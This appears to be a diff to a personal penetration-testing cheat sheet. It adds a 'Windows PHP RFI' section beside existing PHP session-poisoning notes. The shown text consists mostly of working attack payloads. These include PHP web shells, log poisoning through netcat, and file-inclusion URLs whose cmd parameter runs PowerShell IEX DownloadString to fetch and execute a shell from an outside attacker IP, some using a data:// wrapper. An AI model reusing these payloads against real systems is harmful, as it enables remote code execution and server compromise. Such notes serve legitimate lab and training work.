@@ -83,7 +83,13 @@ Location on disk would be /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
 =<?php system($_GET['cmd']); ?>
 =/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
 ````
-
+##### WINDOWS PHP RFI
+```bash
+nc -nv 192.168.136.10 80
+    <?php echo shell_exec($_GET[‘cmd’]);?>
+192.168.136.10/menu.php?file=c:/xampp/apache/logs/access.log&cmd=powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))
+http://192.168.136.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(%22powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))%22)%20?%3E
+```
 ##### Other PHP Wrappers
 ````
 expect wrapper is disabled by default but can prove very useful if enabled
@@ -223,7 +229,8 @@ include($incfile.".php");
 #  POWERSHELL
 ```bash
 Set-ExecutionPolicy Unrestricted
--c is the option used to act like the command is comming from within a powershell already.
+PS C:\> Get-Childitem "C:\*\findme*" -Recurse
+tree /f or tree /a
 ````
 ##### ONE LINER 
 ````
